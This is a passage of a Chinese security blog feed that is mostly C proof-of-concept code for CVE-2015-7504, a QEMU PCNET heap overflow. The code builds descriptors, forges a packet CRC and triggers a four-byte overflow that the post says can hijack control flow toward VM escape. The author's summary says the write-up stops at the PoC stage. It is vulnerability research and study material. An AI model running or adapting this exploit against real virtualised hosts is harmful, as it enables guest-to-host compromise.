class="number">0x9609a88e</span>, <span class="number">0xe10e9818</span>,</span><br><span class="line"><span class="number">0x7f6a0dbb</span>, <span class="number">0x086d3d2d</span>, <span class="number">0x91646c97</span>, <span class="number">0xe6635c01</span>,</span><br><span class="line"><span class="number">0x6b6b51f4</span>, <span class="number">0x1c6c6162</span>, <span class="number">0x856530d8</span>, <span class="number">0xf262004e</span>,</span><br><span class="line"><span class="number">0x6c0695ed</span>, <span class="number">0x1b01a57b</span>, <span class="number">0x8208f4c1</span>, <span class="number">0xf50fc457</span>,</span><br><span class="line"><span class="number">0x65b0d9c6</span>, <span class="number">0x12b7e950</span>, <span class="number">0x8bbeb8ea</span>, <span class="number">0xfcb9887c</span>,</span><br><span class="line"><span class="number">0x62dd1ddf</span>, <span class="number">0x15da2d49</span>, <span class="number">0x8cd37cf3</span>, <span class="number">0xfbd44c65</span>,</span><br><span class="line"><span class="number">0x4db26158</span>, <span class="number">0x3ab551ce</span>, <span class="number">0xa3bc0074</span>, <span class="number">0xd4bb30e2</span>,</span><br><span class="line"><span class="number">0x4adfa541</span>, <span class="number">0x3dd895d7</span>, <span class="number">0xa4d1c46d</span>, <span class="number">0xd3d6f4fb</span>,</span><br><span class="line"><span class="number">0x4369e96a</span>, <span class="number">0x346ed9fc</span>, <span class="number">0xad678846</span>, <span class="number">0xda60b8d0</span>,</span><br><span class="line"><span class="number">0x44042d73</span>, <span class="number">0x33031de5</span>, <span class="number">0xaa0a4c5f</span>, <span class="number">0xdd0d7cc9</span>,</span><br><span class="line"><span class="number">0x5005713c</span>, <span class="number">0x270241aa</span>, <span class="number">0xbe0b1010</span>, <span class="number">0xc90c2086</span>,</span><br><span class="line"><span class="number">0x5768b525</span>, <span class="number">0x206f85b3</span>, <span class="number">0xb966d409</span>, <span class="number">0xce61e49f</span>,</span><br><span class="line"><span class="number">0x5edef90e</span>, <span class="number">0x29d9c998</span>, <span class="number">0xb0d09822</span>, <span class="number">0xc7d7a8b4</span>,</span><br><span class="line"><span class="number">0x59b33d17</span>, <span class="number">0x2eb40d81</span>, <span class="number">0xb7bd5c3b</span>, <span class="number">0xc0ba6cad</span>,</span><br><span class="line"><span class="number">0xedb88320</span>, <span class="number">0x9abfb3b6</span>, <span class="number">0x03b6e20c</span>, <span class="number">0x74b1d29a</span>,</span><br><span class="line"><span class="number">0xead54739</span>, <span class="number">0x9dd277af</span>, <span class="number">0x04db2615</span>, <span class="number">0x73dc1683</span>,</span><br><span class="line"><span class="number">0xe3630b12</span>, <span class="number">0x94643b84</span>, <span class="number">0x0d6d6a3e</span>, <span class="number">0x7a6a5aa8</span>,</span><br><span class="line"><span class="number">0xe40ecf0b</span>, <span class="number">0x9309ff9d</span>, <span class="number">0x0a00ae27</span>, <span class="number">0x7d079eb1</span>,</span><br><span class="line"><span class="number">0xf00f9344</span>, <span class="number">0x8708a3d2</span>, <span class="number">0x1e01f268</span>, <span class="number">0x6906c2fe</span>,</span><br><span class="line"><span class="number">0xf762575d</span>, <span class="number">0x806567cb</span>, <span class="number">0x196c3671</span>, <span class="number">0x6e6b06e7</span>,</span><br><span class="line"><span class="number">0xfed41b76</span>, <span class="number">0x89d32be0</span>, <span class="number">0x10da7a5a</span>, <span class="number">0x67dd4acc</span>,</span><br><span class="line"><span class="number">0xf9b9df6f</span>, <span class="number">0x8ebeeff9</span>, <span class="number">0x17b7be43</span>, <span class="number">0x60b08ed5</span>,</span><br><span class="line"><span class="number">0xd6d6a3e8</span>, <span class="number">0xa1d1937e</span>, <span class="number">0x38d8c2c4</span>, <span class="number">0x4fdff252</span>,</span><br><span class="line"><span class="number">0xd1bb67f1</span>, <span class="number">0xa6bc5767</span>, <span class="number">0x3fb506dd</span>, <span class="number">0x48b2364b</span>,</span><br><span class="line"><span class="number">0xd80d2bda</span>, <span class="number">0xaf0a1b4c</span>, <span class="number">0x36034af6</span>, <span class="number">0x41047a60</span>,</span><br><span class="line"><span class="number">0xdf60efc3</span>, <span class="number">0xa867df55</span>, <span class="number">0x316e8eef</span>, <span class="number">0x4669be79</span>,</span><br><span class="line"><span class="number">0xcb61b38c</span>, <span class="number">0xbc66831a</span>, <span class="number">0x256fd2a0</span>, <span class="number">0x5268e236</span>,</span><br><span class="line"><span class="number">0xcc0c7795</span>, <span class="number">0xbb0b4703</span>, <span class="number">0x220216b9</span>, <span class="number">0x5505262f</span>,</span><br><span class="line"><span class="number">0xc5ba3bbe</span>, <span class="number">0xb2bd0b28</span>, <span class="number">0x2bb45a92</span>, <span class="number">0x5cb36a04</span>,</span><br><span class="line"><span class="number">0xc2d7ffa7</span>, <span class="number">0xb5d0cf31</span>, <span class="number">0x2cd99e8b</span>, <span class="number">0x5bdeae1d</span>,</span><br><span class="line"><span class="number">0x9b64c2b0</span>, <span class="number">0xec63f226</span>, <span class="number">0x756aa39c</span>, <span class="number">0x026d930a</span>,</span><br><span class="line"><span class="number">0x9c0906a9</span>, <span class="number">0xeb0e363f</span>, <span class="number">0x72076785</span>, <span class="number">0x05005713</span>,</span><br><span class="line"><span class="number">0x95bf4a82</span>, <span class="number">0xe2b87a14</span>, <span class="number">0x7bb12bae</span>, <span class="number">0x0cb61b38</span>,</span><br><span class="line"><span class="number">0x92d28e9b</span>, <span class="number">0xe5d5be0d</span>, <span class="number">0x7cdcefb7</span>, <span class="number">0x0bdbdf21</span>,</span><br><span class="line"><span class="number">0x86d3d2d4</span>, <span class="number">0xf1d4e242</span>, <span class="number">0x68ddb3f8</span>, <span class="number">0x1fda836e</span>,</span><br><span class="line"><span class="number">0x81be16cd</span>, <span class="number">0xf6b9265b</span>, <span class="number">0x6fb077e1</span>, <span class="number">0x18b74777</span>,</span><br><span class="line"><span class="number">0x88085ae6</span>, <span class="number">0xff0f6a70</span>, <span class="number">0x66063bca</span>, <span class="number">0x11010b5c</span>,</span><br><span class="line"><span class="number">0x8f659eff</span>, <span class="number">0xf862ae69</span>, <span class="number">0x616bffd3</span>, <span class="number">0x166ccf45</span>,</span><br><span class="line"><span class="number">0xa00ae278</span>, <span class="number">0xd70dd2ee</span>, <span class="number">0x4e048354</span>, <span class="number">0x3903b3c2</span>,</span><br><span class="line"><span class="number">0xa7672661</span>, <span class="number">0xd06016f7</span>, <span class="number">0x4969474d</span>, <span class="number">0x3e6e77db</span>,</span><br><span class="line"><span class="number">0xaed16a4a</span>, <span class="number">0xd9d65adc</span>, <span class="number">0x40df0b66</span>, <span class="number">0x37d83bf0</span>,</span><br><span class="line"><span class="number">0xa9bcae53</span>, <span class="number">0xdebb9ec5</span>, <span class="number">0x47b2cf7f</span>, <span class="number">0x30b5ffe9</span>,</span><br><span class="line"><span class="number">0xbdbdf21c</span>, <span class="number">0xcabac28a</span>, <span class="number">0x53b39330</span>, <span class="number">0x24b4a3a6</span>,</span><br><span class="line"><span class="number">0xbad03605</span>, <span class="number">0xcdd70693</span>, <span class="number">0x54de5729</span>, <span class="number">0x23d967bf</span>,</span><br><span class="line"><span class="number">0xb3667a2e</span>, <span class="number">0xc4614ab8</span>, <span class="number">0x5d681b02</span>, <span class="number">0x2a6f2b94</span>,</span><br><span class="line"><span class="number">0xb40bbe37</span>, <span class="number">0xc30c8ea1</span>, <span class="number">0x5a05df1b</span>, <span class="number">0x2d02ef8d</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pcnet_config32</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span>  mode;      <span class="comment">/* working mode: promiscusous, looptest, etc. */</span></span><br><span class="line">    <span class="keyword">uint8_t</span>   rlen;      <span class="comment">/* number of rx descriptors in log2 base */</span></span><br><span class="line">    <span class="keyword">uint8_t</span>   tlen;      <span class="comment">/* number of tx descriptors in log2 base */</span></span><br><span class="line">    <span class="keyword">uint8_t</span>   mac[<span class="number">6</span>];    <span class="comment">/* mac address */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> _reserved;</span><br><span class="line">    <span class="keyword">uint8_t</span>   ladr[<span class="number">8</span>];   <span class="comment">/* logical address filter */</span></span><br><span class="line">    <span class="keyword">uint32_t</span>  rx_desc;   <span class="comment">/* physical address of rx descriptor buffer */</span></span><br><span class="line">    <span class="keyword">uint32_t</span>  tx_desc;   <span class="comment">/* physical address of tx descriptor buffer */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pcnet_desc</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> addr;</span><br><span class="line">    <span class="keyword">int16_t</span>  length;</span><br><span class="line">    <span class="keyword">int8_t</span>   status_1;</span><br><span class="line">    <span class="keyword">int8_t</span>   status_2;</span><br><span class="line">    <span class="keyword">uint32_t</span> misc;</span><br><span class="line">    <span class="keyword">uint32_t</span> _reserved;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint8_t</span> pcnet_packet[PCNET_BUFFER_SIZE] = &#123;</span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x58</span>,</span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x58</span>,</span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">uint64_t</span> offset;</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pme: 0x%llx\n&quot;</span>, pme);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    gfn = pme &amp; PAGE_PFN;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | ((<span class="keyword">uintptr_t</span>)addr &amp; PAGE_MASK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int fd;</span></span><br><span class="line"><span class="comment">uint32_t page_offset(uint32_t addr)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    return addr &amp; ((1 &lt;&lt; PAGE_SHIFT) - 1);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">uint64_t gva_to_gfn(void *addr)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">uint64_t pme, gfn;</span></span><br><span class="line"><span class="comment">size_t offset;</span></span><br><span class="line"><span class="comment">offset = ((uintptr_t)addr &gt;&gt; 9) &amp; ~7;</span></span><br><span class="line"><span class="comment">lseek(fd, offset, SEEK_SET);</span></span><br><span class="line"><span class="comment">read(fd, &amp;pme, 8);</span></span><br><span class="line"><span class="comment">if (!(pme &amp; PFN_PRESENT))</span></span><br><span class="line"><span class="comment">return -1;</span></span><br><span class="line"><span class="comment">gfn = pme &amp; PAGE_PFN;</span></span><br><span class="line"><span class="comment">return gfn;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">uint64_t gva_to_gpa(void *addr)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">uint64_t gfn = gva_to_gfn(addr);</span></span><br><span class="line"><span class="comment">assert(gfn != -1);</span></span><br><span class="line"><span class="comment">return (gfn &lt;&lt; PAGE_SHIFT) | page_offset((uint64_t)addr);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pcnet_desc_config</span><span class="params">(struct pcnet_desc *desc, <span class="keyword">void</span> *buffer, <span class="keyword">int</span> is_rx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> bcnt = -PCNET_BUFFER_SIZE;</span><br><span class="line">    bcnt &amp;= <span class="number">0xfff</span>;</span><br><span class="line">    bcnt |= <span class="number">0xf000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct pcnet_desc));</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, PCNET_BUFFER_SIZE);</span><br><span class="line">    desc-&gt;addr = (<span class="keyword">uint32_t</span>)gva_to_gpa(buffer);</span><br><span class="line">    desc-&gt;length = bcnt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_rx) &#123;</span><br><span class="line">        <span class="comment">// receive buffers owned by the card</span></span><br><span class="line">        desc-&gt;status_2 = <span class="number">0x80</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        desc-&gt;status_2 = <span class="number">0x83</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">pcnet_card_config</span><span class="params">(struct pcnet_config32 *config,</span></span></span><br><span class="line"><span class="function"><span class="params">                           struct pcnet_desc  *tx_desc,</span></span></span><br><span class="line"><span class="function"><span class="params">                           struct pcnet_desc  *rx_desc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(config, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct pcnet_config32));</span><br><span class="line"></span><br><span class="line">    config-&gt;mode = LOOP | PROM;</span><br><span class="line">    config-&gt;tx_desc = (<span class="keyword">uint32_t</span>)gva_to_gpa(tx_desc);</span><br><span class="line">    config-&gt;rx_desc = (<span class="keyword">uint32_t</span>)gva_to_gpa(rx_desc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> gva_to_gpa(config);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PCNET primitives</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pcnet_packet_patch_crc</span><span class="params">(<span class="keyword">uint8_t</span> *packet, <span class="keyword">uint32_t</span> current,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="keyword">uint32_t</span> target)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> i = <span class="number">0</span>, j;</span><br><span class="line"><span class="keyword">uint8_t</span> *ptr;</span><br><span class="line"><span class="keyword">uint32_t</span> workspace[<span class="number">2</span>] = &#123; current, target &#125;;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">workspace[i] &amp;= (<span class="keyword">uint32_t</span>)~<span class="number">0</span>;</span><br><span class="line">ptr = (<span class="keyword">uint8_t</span> *)(workspace + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(crctab[j] &gt;&gt; <span class="number">24</span> != *(ptr + <span class="number">3</span> - i)) j++;</span><br><span class="line">*((<span class="keyword">uint32_t</span> *)(ptr - i)) ^= crctab[j];</span><br><span class="line">*(ptr - i - <span class="number">1</span>) ^= j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">strncpy</span>(packet, ptr - <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pcnet_packet_send</span><span class="params">(struct pcnet_desc *desc, <span class="keyword">void</span> *buffer,</span></span></span><br><span class="line"><span class="function"><span class="params">                       <span class="keyword">void</span> *packet, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= PCNET_BUFFER_SIZE) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(buffer, packet, len);</span><br><span class="line">        desc-&gt;status_2 |= <span class="number">0x23</span>;</span><br><span class="line"></span><br><span class="line">        len = -len;</span><br><span class="line">        len &amp;= <span class="number">0xfff</span>;</span><br><span class="line">        len |= <span class="number">0xf000</span>;</span><br><span class="line">        desc-&gt;length = len;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// flip ownership to card</span></span><br><span class="line">        desc-&gt;status_2 |= <span class="number">0x80</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// send packet</span></span><br><span class="line">        outw(<span class="number">0</span>, PCNET_PORT + RAP);</span><br><span class="line">        outw(<span class="number">8</span>, PCNET_PORT + RDP);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY);</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pcnet_config32</span> <span class="title">pcnet_config</span>;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> pcnet_config_mem;</span><br><span class="line">    <span class="keyword">uint32_t</span> pcnet_tx_desc_mem;</span><br><span class="line">    <span class="keyword">uint32_t</span> pcnet_rx_desc_mem;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pcnet_desc</span> <span class="title">pcnet_tx_desc</span> <span class="title">PAGE_ALIGNED</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pcnet_desc</span> <span class="title">pcnet_rx_desc</span> <span class="title">PAGE_ALIGNED</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> *pcnet_tx_buffer, *pcnet_rx_buffer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> fcs = ~<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span>  *ptr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> lo, hi;</span><br><span class="line"></span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    addr = aligned_alloc(PAGE_SIZE, PCNET_BUFFER_SIZE);</span><br><span class="line">    pcnet_tx_buffer = (<span class="keyword">uint64_t</span> *)addr;</span><br><span class="line"></span><br><span class="line">    addr = aligned_alloc(PAGE_SIZE, PCNET_BUFFER_SIZE);</span><br><span class="line">    pcnet_rx_buffer = (<span class="keyword">uint64_t</span> *)addr;</span><br><span class="line"></span><br><span class="line">    pcnet_desc_config(&amp;pcnet_tx_desc, pcnet_tx_buffer, <span class="number">0</span>);</span><br><span class="line">    pcnet_desc_config(&amp;pcnet_rx_desc, pcnet_rx_buffer, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    pcnet_config_mem = (<span class="keyword">uint32_t</span>)pcnet_card_config(&amp;pcnet_config,</span><br><span class="line">                                                   &amp;pcnet_tx_desc,</span><br><span class="line">                                                   &amp;pcnet_rx_desc);</span><br><span class="line">    pcnet_tx_desc_mem = (<span class="keyword">uint32_t</span>)gva_to_gpa(&amp;pcnet_tx_desc);</span><br><span class="line">    pcnet_rx_desc_mem = (<span class="keyword">uint32_t</span>)gva_to_gpa(&amp;pcnet_rx_desc);</span><br><span class="line"></span><br><span class="line">    lo = (<span class="keyword">uint16_t</span>)pcnet_config_mem;</span><br><span class="line">    hi = (<span class="keyword">uint16_t</span>)(pcnet_config_mem &gt;&gt; <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// compute required crc</span></span><br><span class="line">    ptr = pcnet_packet;</span><br><span class="line">    <span class="keyword">while</span> (ptr != &amp;pcnet_packet[PCNET_BUFFER_SIZE - <span class="number">4</span>]) &#123;</span><br><span class="line">        CRC(fcs, *ptr++);</span><br><span class="line">    &#125;</span><br><span class="line">    pcnet_packet_patch_crc(ptr, fcs, htonl(<span class="number">0xdeadbeef</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// soft reset</span></span><br><span class="line">    inw(PCNET_PORT + RST);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set software style</span></span><br><span class="line">    outw(<span class="number">58</span>, PCNET_PORT + RAP);</span><br><span class="line">    outw(<span class="number">0x102</span>, PCNET_PORT + RDP);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// card config</span></span><br><span class="line">    outw(<span class="number">1</span>,  PCNET_PORT + RAP);</span><br><span class="line">    outw(lo, PCNET_PORT + RDP);</span><br><span class="line">    outw(<span class="number">2</span>,  PCNET_PORT + RAP);</span><br><span class="line">    outw(hi, PCNET_PORT + RDP);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//CSR_DPOLL</span></span><br><span class="line">    outw(<span class="number">4</span>, PCNET_PORT + RAP);</span><br><span class="line">    outw(<span class="number">0x1000</span>, PCNET_PORT + RDP);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// init and start</span></span><br><span class="line">    outw(<span class="number">0</span>, PCNET_PORT + RAP);</span><br><span class="line">    outw(<span class="number">3</span>, PCNET_PORT + RDP);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//set CSR_SPND</span></span><br><span class="line">    outw(<span class="number">5</span>, PCNET_PORT + RAP);</span><br><span class="line">    outw(<span class="number">0x1</span>, PCNET_PORT + RDP);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//CSR_PROM</span></span><br><span class="line">    outw(<span class="number">15</span>, PCNET_PORT + RAP);</span><br><span class="line">    outw(<span class="number">0x8004</span>, PCNET_PORT + RDP);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//CSR_CRST</span></span><br><span class="line">    outw(<span class="number">41</span>, PCNET_PORT + RAP);</span><br><span class="line">    outw(<span class="number">0x8000</span>, PCNET_PORT + RDP);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//clear CSR_SPND</span></span><br><span class="line">    outw(<span class="number">5</span>, PCNET_PORT + <span class="number">0x12</span>);</span><br><span class="line">    outw(<span class="number">0</span>, PCNET_PORT + <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    pcnet_packet_send(&amp;pcnet_tx_desc, pcnet_tx_buffer, pcnet_packet,</span><br><span class="line">                      PCNET_BUFFER_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>下面这个命令可以查看设备与网卡的对应关系</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls -l /sys/class/net</span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="http://www.phrack.org/papers/vm-escape-qemu-case-study.html">VM escape QEMU Case Study</a></li><li><a href="http://jiayy.me/2019/04/15/CVE-2015-5165-7504/#cve-2015-7504-bug">qemu逃逸漏洞解析</a></li><li><a href="https://github.com/Resery/Virtualized_Learning/tree/master/Vulnerability/CVE-2015-7504">Resery/Virtualized_Learning</a></li><li><a href="https://wiki.osdev.org/AMD_PCNET">AMD PCNET osdev.org</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;CVE-2015-7504是QEMU在仿真pcnet网卡中出现的一个堆溢出漏洞，可以溢出四个字节，可以劫持程序的执行流，结合前面的CVE-2015-5165可以实现任意代码执行。但有一个很致命的问题，宿主机内核需要使用&lt;code&gt;CONFIG_ARCH_BINFMT_ELF_RANDOMIZE_PIE &lt;/code&gt;标志进行编译，否则在溢出的四个字节没法成功修改地址（总体八个字节的地址，因此需要高四字节与目标地址一致）。这个编译标志在目前最新的Ubuntu16.04中似乎已经没有了，所以就不进行完整的复现了，仅复现至PoC部分。&lt;/p&gt;
&lt;h2 id=&quot;PCNET网卡&quot;&gt;&lt;a href=&quot;#PCNET网卡&quot; class=&quot;headerlink&quot; title=&quot;PCNET网卡&quot;&gt;&lt;/a&gt;PCNET网卡&lt;/h2&gt;&lt;p&gt;AMD 的PCNET系列网卡被许多虚拟机或仿真器支持，如QEMU、VMware和VirtualBox。虽然没有RTL8139简易，但它的支持更加广泛，RTL8139只在QEMU中有支持。&lt;/p&gt;
&lt;p&gt;网卡有16位和32位两种模式，这取决于DWIO 的值（储存在卡中变量），16位模式是网卡重置之后的默认模式。网卡有两类内部寄存器：CSR（控制和状态寄存器）和BCR（Bus Control Register）。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0                                  16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+----------------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|              EPROM               |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+----------------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|      RDP - Data reg for CSR      |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+----------------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| RAP - Index reg for CSR and BCR  |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+----------------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|           Reset reg              |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+----------------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|      BDP - Data reg for BCR      |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+----------------------------------+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="QEMU" scheme="http://hhdx.xyz/tags/QEMU/"/>
    
    <category term="CVE" scheme="http://hhdx.xyz/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>QEMU信息泄露漏洞分析与利用----CVE-2015-5165</title>
    <link href="http://hhdx.xyz/2020/12/05/CVE-2015-5165/"/>
    <id>http://hhdx.xyz/2020/12/05/CVE-2015-5165/</id>
    <published>2020-12-05T07:58:52.000Z</published>
    <updated>2020-12-07T06:03:48.720Z</updated>
    
